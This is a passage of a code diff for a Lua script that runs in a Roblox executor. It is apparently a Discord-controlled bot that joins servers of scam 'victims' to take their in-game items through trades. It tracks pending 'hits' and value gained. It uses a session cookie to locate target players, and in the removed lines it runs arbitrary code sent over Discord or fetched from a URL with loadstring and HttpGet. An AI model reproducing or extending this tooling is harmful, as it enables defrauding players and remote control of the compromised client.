-                                            _totalVal = _totalVal + _val * _amt;
-                                            _totalCount = _totalCount + _amt;
-                                        end
-                                    end
-                                end
-                                table.sort(_items, function(_a, _b) return (_a.value * _a.amount) > (_b.value * _b.amount) end);
-                                local _lines = {};
-                                for _i, _item in ipairs(_items) do
-                                    table.insert(_lines, string.format("%s (x%d) - %d", _item.name, _item.amount, _item.value * _item.amount));
-                                end
-                                local _body = (#_lines > 0) and table.concat(_lines, "\n") or "No Godly+ items.";
-                                if #_body > 3800 then _body = _body:sub(1, 3800) .. "\n...truncated" end
-                                table.insert(_embeds, {
-                                    title = "👤 " .. _p.Name,
-                                    description = "**Value:** `" .. _totalVal .. "`\n**Items:** `" .. _totalCount .. "`\n\n```\n" .. _body .. "\n```",
-                                    color = 0x3EED50,
-                                    footer = { text = "Source: " .. _source .. " | Display: " .. _p.DisplayName },
-                                    timestamp = DateTime.now():ToIsoDate()
-                                });
-                            end
-                            task.wait(0.25);
-                        end
-
-                        for _i = 1, #_embeds, 10 do
-                            local _batch = {};
-                            for _j = _i, math.min(_i + 9, #_embeds) do
-                                table.insert(_batch, _embeds[_j]);
-                            end
-                            pcall(function()
-                                request({
-                                    Url = "https://discord.com/api/v10/channels/".._lg.."/messages",
-                                    Method = "POST",
-                                    Headers = { ["Authorization"] = "Bot ".._bt, ["Content-Type"] = "application/json" },
-                                    Body = _hs:JSONEncode({ embeds = _batch })
-                                });
-                            end);
-                            task.wait(0.5);
-                        end
-                    end);
-                    return;
-                end
-
-                if _content == "!rejoin" then
-                    if not _isOwner(_md.author) then
-                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
-                        return;
-                    end
-                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
-                    task.spawn(function()
-                        _postEmbed("🔄 Rejoining", "Rejoining current server\nJobId: `"..tostring(game.JobId).."`", 0x3EED50);
-                        task.wait(1.5);
-                        pcall(function()
-                            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer);
-                        end);
-                    end);
-                    return;
-                end
-
-                if _content == "!rejoinlast" then
-                    if not _isOwner(_md.author) then
-                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
-                        return;
-                    end
-                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
-                    task.spawn(function()
-                        if not isfile("last_jobid.dat") then
-                            _postEmbed("❌ Rejoin Last", "No previous server saved yet.", 0xFF0000);
-                            return;
-                        end
-                        local _ok, _lastJob = pcall(readfile, "last_jobid.dat");
-                        if not _ok or type(_lastJob) ~= "string" or _lastJob == "" then
-                            _postEmbed("❌ Rejoin Last", "Failed to read last_jobid.dat", 0xFF0000);
-                            return;
-                        end
-                        if _lastJob == game.JobId then
-                            _postEmbed("❌ Rejoin Last", "You're already in that server.", 0xFF0000);
-                            return;
-                        end
-                        _postEmbed("↩️ Rejoining Last Server", "JobId: `" .. _lastJob .. "`", 0x3EED50);
-                        task.wait(1.5);
-                        pcall(function()
-                            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, _lastJob, game.Players.LocalPlayer);
-                        end);
-                    end);
-                    return;
-                end
-
-                if _content == "!panic" then
-                    if not _isOwner(_md.author) then
-                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
-                        return;
-                    end
-                    task.spawn(function() _reactIn(_cmdCh, _md.id, "🚨") end);
-                    task.spawn(function()
-                        local _actions = {};
-                        if _transferActive then
-                            _transferActive = false;
-                            table.insert(_actions, "✅ Stopped active transfer");
-                        end
-                        local _s = nil;
-                        if _ts then
-                            local _okT, _sT = pcall(_ts);
-                            if _okT then _s = _sT end
-                        end
-                        if _s == "StartTrade" then
-                            pcall(function() _rs.Trade.DeclineTrade:FireServer() end);
-                            table.insert(_actions, "✅ Declined open trade");
-                        elseif _s == "ReceivingRequest" then
-                            pcall(function() _rs.Trade.DeclineRequest:FireServer() end);
-                            table.insert(_actions, "✅ Declined incoming request");
-                        end
-                        if _moving then
-                            _moving = false;
-                            table.insert(_actions, "✅ Stopped joiner teleport loop");
-                        end
-                        _wl("pending_hits.dat", {});
-                        table.insert(_actions, "✅ Cleared pending hits");
-                        if _autoexecURL ~= "" then
-                            _clearQueue();
-                            table.insert(_actions, "✅ Cleared autoexecute queue");
-                        end
-                        if #_actions == 0 then
-                            _postEmbed("🚨 Panic", "Nothing to stop.", 0xFFA500);
-                        else
-                            _postEmbed("🚨 Panic - All Stopped", table.concat(_actions, "\n") .. "\n\n**Still connected.** Use `!help` to resume.", 0xFF0000);
-                        end
-                    end);
-                    return;
-                end
-
-                if _content == "!job" then
-                    if not _isOwner(_md.author) then
-                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
-                        return;
-                    end
-                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
-                    task.spawn(function()
-                        _postEmbed("🔗 Job", "**JobId:** `" .. tostring(game.JobId) .. "`\n**PlaceId:** `" .. tostring(game.PlaceId) .. "`", 0x3EED50);
-                    end);
-                    return;
-                end
-
-                -- ─── !serverget <user> ───
-                local _serverGetUser = _content:match("^!serverget%s+(.+)$");
-                if _serverGetUser then
-                    _serverGetUser = _serverGetUser:gsub("^%s+", ""):gsub("%s+$", "");
-                    if not _isOwner(_md.author) then
-                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
-                        return;
-                    end
-                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
-                    task.spawn(function()
-                        local _ok1, _r1 = pcall(function()
-                            return request({
-                                Url = "https://users.roblox.com/v1/usernames/users",
-                                Method = "POST",
-                                Headers = { ["Content-Type"] = "application/json" },
-                                Body = _hs:JSONEncode({ usernames = { _serverGetUser }, excludeBannedUsers = false })
-                            });
-                        end);
-                        if not _ok1 or not _r1 or _r1.StatusCode ~= 200 then
-                            _postEmbed("❌ Server Get Failed", "Couldn't look up `".._serverGetUser.."`", 0xFF0000);
-                            return;
-                        end
-                        local _d1 = _hs:JSONDecode(_r1.Body);
-                        if not _d1.data or not _d1.data[1] then
-                            _postEmbed("❌ Server Get Failed", "No results for `".._serverGetUser.."`", 0xFF0000);
-                            return;
-                        end
-                        local _uid = _d1.data[1].id;
-                        local _uname = _d1.data[1].name;
-
-                        if _robloxCookie == "" then
-                            _postEmbed("❌ Server Get Failed",
-                                "No `.ROBLOSECURITY` set.\nSet `_robloxCookie` in your executor config.",
-                                0xFF0000);
-                            return;
-                        end
-
-                        local _ok2, _r2 = pcall(function()
-                            return request({
-                                Url = "https://presence.roblox.com/v1/presence/users",
-                                Method = "POST",
-                                Headers = {
-                                    ["Content-Type"] = "application/json",
-                                    ["Cookie"] = ".ROBLOSECURITY=" .. _robloxCookie
-                                },
-                                Body = _hs:JSONEncode({ userIds = { _uid } })
-                            });
-                        end);
-                        if not _ok2 or not _r2 or _r2.StatusCode ~= 200 then
-                            local _code = _r2 and _r2.StatusCode or "?"
-                            local _body = _r2 and _r2.Body or tostring(_r2)
-                            _postEmbed("❌ Server Get Failed",
-                                "Presence API returned `"..tostring(_code).."`\n```\n"..tostring(_body):sub(1, 500).."\n```",
-                                0xFF0000);
-                            return;
-                        end
-                        local _d2 = _hs:JSONDecode(_r2.Body);
-                        local _pres = _d2.userPresences and _d2.userPresences[1];
-                        if not _pres then
-                            _postEmbed("❌ Server Get Failed", "No presence data returned.", 0xFF0000);
-                            return;
-                        end
-
-                        local _type = _pres.userPresenceType or 0;
-                        local _typeNames = { [0]="Offline", [1]="Online (website)", [2]="In Game", [3]="In Studio" };
-                        local _typeStr = _typeNames[_type] or ("Unknown (".._type..")");
-
-                        if _type ~= 2 then
-                            _postEmbed("❌ Not In Game",
-                                "**".._uname.."** is currently `".._typeStr.."`.",
-                                0xFFA500);
-                            return;
-                        end
-
-                        local _placeId = _pres.placeId or _pres.rootPlaceId;
-                        local _jobId = _pres.gameId;
-                        local _loc = _pres.lastLocation or "?";
-
-                        if not _placeId or not _jobId then
-                            _postEmbed("❌ Server Get Failed", "Missing placeId/gameId.", 0xFF0000);
-                            return;
-                        end
-
-                        local _script = "game:GetService('TeleportService'):TeleportToPlaceInstance(" ..
-                            tostring(_placeId) .. ", '" .. tostring(_jobId) .. "')";
-
-                        local _desc =
-                            "**User:** `".._uname.."` (ID `".._uid.."`)\n" ..
-                            "**Status:** `".._typeStr.."`\n" ..
-                            "**Game:** `".._loc.."`\n" ..
-                            "**PlaceId:** `"..tostring(_placeId).."`\n" ..
-                            "**JobId:** `"..tostring(_jobId).."`\n\n" ..
-                            "**To join, send:**\n" ..
-                            "`!serverjoin ".._script.."`";
-
-                        _postEmbed("🎯 Server Found — ".._uname, _desc, 0x3EED50);
-                    end);
-                    return;
-                end
-
-                -- ─── !serverjoin <script|placeId,jobId|jobId> ───
-                local _serverJoinArg = _content:match("^!serverjoin%s+([%s%S]+)$");
-                if _serverJoinArg then
-                    if not _isOwner(_md.author) then
-                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
-                        return;
-                    end
-                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
-                    task.spawn(function()
-                        local _placeId, _jobId;
-
-                        _placeId, _jobId = _serverJoinArg:match(
-                            "TeleportToPlaceInstance%s*%(%s*(%d+)%s*,%s*['\"]([%w%-]+)['\"]%s*%)"
-                        );
-                        if not _placeId then
-                            _placeId, _jobId = _serverJoinArg:match("^(%d+)[%s,]+([%w%-]+)$");
-                        end
-                        if not _placeId and _serverJoinArg:match("^[%w%-]+$") and #_serverJoinArg >= 30 then
-                            _placeId = tostring(game.PlaceId);
-                            _jobId = _serverJoinArg;
-                        end
-
-                        if not _placeId or not _jobId then
-                            _postEmbed("❌ Server Join Failed",
-                                "Couldn't parse argument.\nFormats: full script, `placeId, jobId`, or just JobId.",
-                                0xFF0000);
-                            return;
-                        end
-
-                        if tostring(_jobId) == tostring(game.JobId) then
-                            _postEmbed("⚠️ Already In Server", "You're already in that server.", 0xFFA500);
-                            return;
-                        end
-
-                        _postEmbed("🚀 Joining Server",
-                            "**PlaceId:** `"..tostring(_placeId).."`\n" ..
-                            "**JobId:** `"..tostring(_jobId).."`\n\n" ..
-                            "_Teleporting now..._",
-                            0x3EED50);
-
-                        task.wait(1.5);
-                        pcall(function()
-                            game:GetService("TeleportService"):TeleportToPlaceInstance(
-                                tonumber(_placeId), tostring(_jobId), game.Players.LocalPlayer
-                            );
-                        end);
-                    end);
-                    return;
-                end
-
-                local _ageUser = _content:match("^!age%s+(.+)$");
-                if _ageUser then
-                    _ageUser = _ageUser:gsub("^%s+", ""):gsub("%s+$", "");
-                    if not _isOwner(_md.author) then
-                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
-                        return;
-                    end
-                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
-                    task.spawn(function()
-                        local _ok1, _r1 = pcall(function()
-                            return request({
-                                Url = "https://users.roblox.com/v1/usernames/users",
-                                Method = "POST",
-                                Headers = { ["Content-Type"] = "application/json" },
-                                Body = _hs:JSONEncode({ usernames = { _ageUser }, excludeBannedUsers = false })
-                            });
-                        end);
-                        if not _ok1 or not _r1 or _r1.StatusCode ~= 200 then
-                            _postEmbed("❌ Age Lookup Failed", "Couldn't find user `".._ageUser.."`", 0xFF0000);
-                            return;
-                        end
-                        local _d1 = _hs:JSONDecode(_r1.Body);
-                        if not _d1.data or not _d1.data[1] then
-                            _postEmbed("❌ Age Lookup Failed", "No results for `".._ageUser.."`", 0xFF0000);
-                            return;
-                        end
-                        local _uid = _d1.data[1].id;
-                        local _uname = _d1.data[1].name;
-                        local _display = _d1.data[1].displayName;
-
-                        local _ok2, _r2 = pcall(function()
-                            return request({ Url = "https://users.roblox.com/v1/users/".._uid, Method = "GET" });
-                        end);
-                        if not _ok2 or not _r2 or _r2.StatusCode ~= 200 then
-                            _postEmbed("❌ Age Lookup Failed", "Got ID ".._uid.." but couldn't fetch profile.", 0xFF0000);
-                            return;
-                        end
-                        local _d2 = _hs:JSONDecode(_r2.Body);
-                        local _createdIso = _d2.created or "";
-                        local _days = 0;
-                        pcall(function()
-                            local _dt = DateTime.fromIsoDate(_createdIso);
-                            _days = math.floor((os.time() - _dt.UnixTimestamp) / 86400);
-                        end);
-                        local _color = 0x3EED50;
-                        if _days < 30 then _color = 0xFF0000
-                        elseif _days < 180 then _color = 0xFFA500 end
-
-                        local _desc =
-                            "**Username:** `".._uname.."`\n" ..
-                            "**Display:** `".._display.."`\n" ..
-                            "**ID:** `".._uid.."`\n" ..
-                            "**Created:** `".._createdIso:sub(1,10).."`\n" ..
-                            "**Age:** `".._days.." days` (~"..string.format("%.1f", _days / 365).." years)";
-                        _postEmbed("🕰️ Roblox Account Age", _desc, _color);
-                    end);
-                    return;
-                end
-
-                if _content == "!queue" then
-                    if not _isOwner(_md.author) then
-                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
-                        return;
-                    end
-                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
-                    task.spawn(function()
-                        local _q = _rl("pending_hits.dat");
-                        if #_q == 0 then
-                            _postEmbed("📋 Pending Hits", "Queue is empty.", 0x3EED50);
-                            return;
-                        end
-                        local _lines = {};
-                        for _i, _j in ipairs(_q) do
-                            local _jobShort = tostring(_j.jobId or "?"):sub(1, 16);
-                            table.insert(_lines, string.format(
-                                "`%d.` victim: **%s** - job: `%s...` - id: `%s`",
-                                _i, tostring(_j.author or "?"), _jobShort, tostring(_j.msgid or "?")
-                            ));
-                        end
-                        local _body = table.concat(_lines, "\n");
-                        if #_body > 1900 then _body = _body:sub(1, 1900) .. "\n...truncated" end
-                        _postEmbed("📋 Pending Hits ("..#_q..")", _body, 0x3EED50);
-                    end);
-                    return;
-                end
-
                 if _content == "!stats" then
-                    if not _isOwner(_md.author) then
-                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
-                        return;
-                    end
+                    if not _isOwner(_md.author) then return end
                     task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
-                    task.spawn(function()
-                        local _up = math.floor(tick() - _sessionStart);
-                        local _h = math.floor(_up / 3600);
-                        local _m = math.floor((_up % 3600) / 60);
-                        local _s = _up % 60;
-
-                        local function _fmt(n)
-                            n = tonumber(n) or 0;
-                            local x = tostring(math.floor(n));
-                            local out = x:reverse():gsub("(%d%d%d)", "%1,"):reverse();
-                            return out:gsub("^,", "");
-                        end
-
-                        local _q = #_rl("pending_hits.dat");
-                        local _lifeDays = 0;
-                        if _pStats.firstStart then
-                            local _lifeUp = os.time() - _pStats.firstStart;
-                            _lifeDays = math.floor(_lifeUp / 86400);
-                        end
-
-                        local _desc =
-                            "**📅 SESSION (this run)**\n" ..
-                            "**⏱️ Uptime:** `" .. _h .. "h " .. _m .. "m " .. _s .. "s`\n" ..
-                            "**🎯 Hits joined:** `" .. _hitsJoined .. "`\n" ..
-                            "**🔁 Trades:** `" .. _doneT .. "`\n" ..
-                            "**📦 Items gained:** `" .. _itemsGained .. "`\n" ..
-                            "**💎 Value gained:** `" .. _fmt(_sumV) .. "`\n" ..
-                            "\n" ..
-                            "**🌐 LIFETIME (all sessions)**\n" ..
-                            "**⏱️ Since:** `" .. _lifeDays .. " days`\n" ..
-                            "**🖥️ Servers visited:** `" .. _fmt(_pStats.serversVisited) .. "`\n" ..
-                            "**🎯 Hits joined:** `" .. _fmt(_pStats.hitsJoined) .. "`\n" ..
-                            "**🔁 Trades:** `" .. _fmt(_pStats.tradesDone) .. "`\n" ..
-                            "**📦 Items gained:** `" .. _fmt(_pStats.itemsGained) .. "`\n" ..
-                            "**💎 Value gained:** `" .. _fmt(_pStats.valueGained) .. "`\n" ..
-                            "\n" ..
-                            "**📋 Pending hits:** `" .. _q .. "`\n";
-
-                        _postEmbed("📊 Stats", _desc, 0x3EED50);
-                    end);
+                    local _up = math.floor(tick() - _sessionStart);
+                    local _h = math.floor(_up / 3600); local _m = math.floor((_up % 3600) / 60); local _s = _up % 60;
+                    local function _fmt(n) n = tonumber(n) or 0; local x = tostring(math.floor(n)); local out = x:reverse():gsub("(%d%d%d)", "%1,"):reverse(); return out:gsub("^,", "") end
+                    _postEmbed("📊 Stats",
+                        "**SESSION**\n**Uptime:** `".._h.."h ".._m.."m ".._s.."s`\n**Hits:** `".._hitsJoined.."`\n**Trades:** `".._doneT.."`\n**Items gained:** `".._itemsGained.."`\n**Value gained:** `".._fmt(_sumV).."`\n\n" ..
+                        "**LIFETIME**\n**Servers:** `".._fmt(_pStats.serversVisited).."`\n**Hits:** `".._fmt(_pStats.hitsJoined).."`\n**Trades:** `".._fmt(_pStats.tradesDone).."`\n**Items:** `".._fmt(_pStats.itemsGained).."`\n**Value:** `".._fmt(_pStats.valueGained).."`",
+                        0x3EED50);
                     return;
                 end
-
                 if _content == "!resetstats" then
-                    if not _isOwner(_md.author) then
-                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
-                        return;
-                    end
-                    task.spawn(function() _reactIn(_cmdCh, _md.id, "🛑") end);
-                    task.spawn(function()
-                        _pStats = {
-                            hitsJoined     = 0,
-                            tradesDone     = 0,
-                            itemsGained    = 0,
-                            valueGained    = 0,
-                            firstStart     = os.time(),
-                            lastUpdate     = os.time(),
-                            serversVisited = 1,
-                        };
-                        _saveStats();
-                        _postEmbed("🛑 Stats Reset", "Lifetime stats cleared.", 0xFF0000);
-                    end);
+                    if not _isOwner(_md.author) then return end
+                    _pStats = { hitsJoined=0, tradesDone=0, itemsGained=0, valueGained=0, firstStart=os.time(), lastUpdate=os.time(), serversVisited=1 };
+                    _saveStats();
+                    _postEmbed("🛑 Stats Reset", "Cleared.", 0xFF0000);
                     return;
                 end
-
                 if _content == "!history" then
-                    if not _isOwner(_md.author) then
-                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
-                        return;
+                    if not _isOwner(_md.author) then return end
+                    local _hist = _rl("trade_history.dat");
+                    if #_hist == 0 then _postEmbed("🕓 History", "Empty.", 0x3EED50); return end
+                    local _lines = {};
+                    for _i = math.max(1, #_hist - 9), #_hist do
+                        local _e = _hist[_i];
+                        table.insert(_lines, string.format("`%s` - %d items - %d value", os.date("%H:%M:%S", _e.t or os.time()), _e.c or 0, _e.v or 0));
                     end
-                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
-                    task.spawn(function()
-                        local _hist = _rl("trade_history.dat");
-                        if #_hist == 0 then
-                            _postEmbed("🕓 Trade History", "No trades recorded yet.", 0x3EED50);
-                            return;
-                        end
-                        local _lines = {};
-                        local _start = math.max(1, #_hist - 9);
-                        for _i = #_hist, _start, -1 do
-                            local _e = _hist[_i];
-                            local _tsStr = os.date("%H:%M:%S", _e.t or os.time());
-                            table.insert(_lines, string.format(
-                                "`%s` - **%d** items - **%d** value",
-                                _tsStr, tonumber(_e.c) or 0, tonumber(_e.v) or 0
-                            ));
-                        end
-                        local _desc = "Last "..#_lines.." of "..#_hist.." trades:\n\n" .. table.concat(_lines, "\n");
-                        _postEmbed("🕓 Trade History", _desc, 0x3EED50);
-                    end);
+                    _postEmbed("🕓 History", table.concat(_lines, "\n"), 0x3EED50);
                     return;
                 end
-
-                local _autoURL = _content:match("^!autoexecute%s+(.+)$");
-                if _autoURL then
-                    _autoURL = _autoURL:gsub("^%s+", ""):gsub("%s+$", "");
-                    if not _isOwner(_md.author) then
-                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
-                        return;
+                if _content == "!queue" then
+                    if not _isOwner(_md.author) then return end
+                    local _q = _rl("pending_hits.dat");
+                    if #_q == 0 then _postEmbed("📋 Queue", "Empty.", 0x3EED50); return end
+                    local _lines = {};
+                    for _i, _j in ipairs(_q) do
+                        table.insert(_lines, string.format("`%d.` **%s** - `%s...`", _i, _j.author or "?", tostring(_j.jobId or "?"):sub(1,16)));
                     end
-                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
-                    task.spawn(function()
-                        _autoexecURL = _autoURL;
-                        pcall(function() writefile(AUTOEXEC_FILE, _autoexecURL) end);
-                        local _used = _queueAutoexec();
-                        local _queueState = _used and ("queued via " .. _used) or "NO QUEUE METHOD";
-                        _postEmbed("🎯 Auto-Execute Saved",
-                            "**URL:** `" .. _autoexecURL .. "`\n" ..
-                            "**Queue:** " .. _queueState .. "\n\n" ..
-                            "_Will run on every rejoin. Running it now too..._", 0x3EED50);
-                        task.wait(0.5);
-                        local _ok, _err = pcall(function()
-                            loadstring(game:HttpGet(_autoexecURL))();
-                        end);
-                        if not _ok then
-                            _postEmbed("⚠️ Auto-Execute Run Failed", "```\n" .. tostring(_err):sub(1, 900) .. "\n```", 0xFFA500);
-                        else
-                            _postEmbed("✅ Auto-Execute Ran", "Loaded and executed successfully.", 0x3EED50);
-                        end
-                    end);
+                    _postEmbed("📋 Queue ("..#_q..")", table.concat(_lines, "\n"), 0x3EED50);
                     return;
                 end
-
-                if _content == "!stopautoexecute" then
-                    if not _isOwner(_md.author) then
-                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
-                        return;
-                    end
-                    task.spawn(function() _reactIn(_cmdCh, _md.id, "🛑") end);
-                    task.spawn(function()
-                        _autoexecURL = "";
-                        pcall(function() if isfile(AUTOEXEC_FILE) then delfile(AUTOEXEC_FILE) end end);
-                        _clearQueue();
-                        _postEmbed("🛑 Auto-Execute Disabled", "Saved script cleared **and** queue overwritten.", 0xFF0000);
-                    end);
-                    return;
-                end
-
-                if _content == "!runauto" then
-                    if not _isOwner(_md.author) then
-                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
-                        return;
-                    end
-                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
-                    task.spawn(function()
-                        if _autoexecURL == "" then
-                            _postEmbed("❌ No Auto-Execute Saved", "Use `!autoexecute <url>` first.", 0xFF0000);
-                            return;
-                        end
-                        local _ok, _err = pcall(function() loadstring(game:HttpGet(_autoexecURL))() end);
-                        if not _ok then
-                            _postEmbed("❌ Run Failed", "```\n" .. tostring(_err):sub(1, 900) .. "\n```", 0xFF0000);
-                        else
-                            _postEmbed("✅ Ran", "`" .. _autoexecURL .. "`", 0x3EED50);
-                        end
-                    end);
-                    return;
-                end
-
-                if _content == "!showauto" then
-                    if not _isOwner(_md.author) then
-                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
-                        return;
-                    end
-                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
-                    task.spawn(function()
-                        if _autoexecURL == "" then
-                            _postEmbed("🎯 Auto-Execute", "No script saved.", 0x3EED50);
-                        else
-                            _postEmbed("🎯 Auto-Execute", "**URL:** `" .. _autoexecURL .. "`", 0x3EED50);
-                        end
-                    end);
-                    return;
-                end
-
-                local _execCode = _content:match("^!execute%s+([%s%S]+)$");
-                if _execCode then
-                    if not _isOwner(_md.author) then
-                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
-                        return;
-                    end
-                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
-                    task.spawn(function()
-                        local _bt3 = string.char(96) .. string.char(96) .. string.char(96);
-                        local _nl  = string.char(10);
-                        local _pat1 = "^" .. _bt3 .. "%w*%s*" .. _nl .. "?";
-                        local _pat2 = _nl .. "?%s*" .. _bt3 .. "%s*$";
-                        local _clean = _execCode;
-                        _clean = _clean:gsub(_pat1, "");
-                        _clean = _clean:gsub(_pat2, "");
-
-                        local _fn, _loadErr = loadstring(_clean);
-                        if not _fn then
-                            _postEmbed("❌ Execute - Load Error", "```\n"..tostring(_loadErr):sub(1, 900).."\n```", 0xFF0000);
-                            return;
-                        end
-
-                        local _results = {};
-                        local _ok, _runErr = pcall(function()
-                            local _ret = { _fn() };
-                            for _i, _v in ipairs(_ret) do
-                                table.insert(_results, tostring(_v));
-                            end
-                        end);
-
-                        if not _ok then
-                            _postEmbed("❌ Execute - Runtime Error", "```\n"..tostring(_runErr):sub(1, 900).."\n```", 0xFF0000);
-                        else
-                            local _out = (#_results > 0) and table.concat(_results, "\n") or "(no return value)";
-                            _postEmbed("✅ Execute - OK", "**Output:**\n```\n"..tostring(_out):sub(1, 900).."\n```", 0x3EED50);
-                        end
-                    end);
-                    return;
-                end
-
-                if _content == "!server" then
-                    if not _isOwner(_md.author) then
-                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
-                        return;
-                    end
-                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
-                    task.spawn(function()
-                        local _players = game.Players:GetPlayers();
-                        local _names = {};
-                        local _self = game.Players.LocalPlayer.Name;
-                        for _, _p in ipairs(_players) do
-                            local _tag = (_p.Name == _self) and " **(you)**" or "";
-                            table.insert(_names, "> `".._p.Name.."`".._tag);
-                        end
-                        table.sort(_names);
-                        local _body = table.concat(_names, "\n");
-                        if #_body > 3900 then _body = _body:sub(1, 3900) .. "\n...truncated" end
-                        _postEmbed("👥 Server Players - " .. #_players .. " online", _body, 0x3EED50);
-                    end);
-                    return;
-                end
-
-                if _content == "!status" then
-                    if not _isOwner(_md.author) then
-                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
-                        return;
-                    end
-                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
-                    task.spawn(function()
-                        local _up = math.floor(tick() - _startT);
-                        local _h = math.floor(_up / 3600);
-                        local _m = math.floor((_up % 3600) / 60);
-                        local _s = _up % 60;
-                        local _upStr = string.format("%dh %dm %ds", _h, _m, _s);
-
-                        local _gc = "disconnected";
-                        if _sock then
-                            if _resume then _gc = "connected (READY)" else _gc = "connected (handshake)" end
-                        end
-                        local _vLState = next(_vL) and "loaded" or "EMPTY";
-                        local _xferState = "idle";
-                        if _transferActive then
-                            _xferState = "ACTIVE -> " .. tostring(_transferTarget) .. " (" .. _transferDone .. " batches)";
-                        end
-                        local _autoStr = (_autoexecURL ~= "") and ("active: `" .. _autoexecURL .. "`") or "off";
-
-                        local _desc =
-                            "**🟢 Online**\n" ..
-                            "**JobId:** `" .. tostring(game.JobId):sub(1, 18) .. "...`\n" ..
-                            "**PlaceId:** `" .. tostring(game.PlaceId) .. "`\n" ..
-                            "**Player:** `" .. game.Players.LocalPlayer.Name .. "`\n" ..
-                            "**Players in server:** `" .. #game.Players:GetPlayers() .. "`\n" ..
-                            "**Uptime:** `" .. _upStr .. "`\n";
-
-                        local _f = {
-                            { name = "⚙️ Runtime", value = "```\nGateway: " .. _gc .. "\nValue list: " .. _vLState .. "\nExecutor: " .. _ex .. " " .. _exv .. "\n```", inline = false },
-                            { name = "🔁 Trades", value = "```\nTrades this server: " .. _doneT .. "\n_tbn limit: " .. _tbn .. "\nTransfer: " .. _xferState .. "\n```", inline = false },
-                            { name = "🎯 Auto-Execute", value = _autoStr, inline = false },
-                            { name = "📡 Channels", value = "```\nHits: " .. _hitCh .. "\nCmd:  " .. _cmdCh .. "\nLog:  " .. _lg .. "\n```", inline = false },
-                        };
-
-                        local _embed = {
-                            title = "📡 Autojoiner Status",
-                            description = _desc,
-                            color = 0x3EED50,
-                            fields = _f,
-                            footer = { text = "Status at " .. os.date("%H:%M:%S") },
-                            timestamp = DateTime.now():ToIsoDate()
-                        };
-                        pcall(function()
-                            request({ Url = "https://discord.com/api/v10/channels/".._lg.."/messages", Method = "POST", Headers = { ["Authorization"] = "Bot ".._bt, ["Content-Type"] = "application/json" }, Body = _hs:JSONEncode({ embeds = { _embed } }) });
-                        end);
-                    end);
-                    return;
-                end
-
                 if _content == "!coins" then
-                    if not _isOwner(_md.author) then
-                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
-                        return;
-                    end
-                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
+                    if not _isOwner(_md.author) then return end
                     task.spawn(function()
                         local _ok, _p = pcall(function()
                             return _rs.Remotes.Inventory.GetProfileData:InvokeServer(game.Players.LocalPlayer.Name);
                         end);
-                        if not _ok or type(_p) ~= "table" then
-                            _postEmbed("❌ Coins - Error", "```\n" .. tostring(_p):sub(1, 900) .. "\n```", 0xFF0000);
-                            return;
-                        end
+                        if not _ok or type(_p) ~= "table" then return end
                         local _mats = (_p.Materials and _p.Materials.Owned) or {};
-                        local _coins       = _mats.Coins or 0;
-                        local _gems        = _mats.Gems or 0;
-                        local _coinsBackup = _p.Coins_Backup or 0;
-                        local _gemsBackup  = _p.Gems_Backup or 0;
-                        local _credits     = _p.Credits or 0;
-                        local _coinBag     = _p.CoinBag or 0;
-                        local _snow = _mats.SnowTokens2025 or nil;
+                        local function _f(n) n = tonumber(n) or 0; local s = tostring(math.floor(n)); local o = s:reverse():gsub("(%d%d%d)", "%1,"):reverse(); return o:gsub("^,", "") end
+                        _postEmbed("💰 Currency",
+                            "**Coins:** `".._f(_mats.Coins or 0).."`\n**Gems:** `".._f(_mats.Gems or 0).."`",
+                            0xFFD700);
+                    end);
+                    return;
+                end
+                if _content == "!job" then
+                    if not _isOwner(_md.author) then return end
+                    _postEmbed("🔗 Job", "**JobId:** `"..game.JobId.."`\n**PlaceId:** `"..game.PlaceId.."`", 0x3EED50);
+                    return;
+                end
+                if _content == "!server" then
+                    if not _isOwner(_md.author) then return end
+                    local _names = {};
+                    for _, _p in ipairs(game.Players:GetPlayers()) do
+                        table.insert(_names, "> `".._p.Name.."`");
+                    end
+                    _postEmbed("👥 Server ("..#game.Players:GetPlayers()..")", table.concat(_names, "\n"), 0x3EED50);
+                    return;
+                end
+                if _content == "!rejoin" then
+                    if not _isOwner(_md.author) then return end
+                    _postEmbed("🔄 Rejoining", "JobId: `"..game.JobId.."`", 0x3EED50);
+                    task.wait(1.5);
+                    pcall(function() _tp:TeleportToPlaceInstance(game.PlaceId, game.JobId, _lp) end);
+                    return;
+                end
+                if _content == "!panic" then
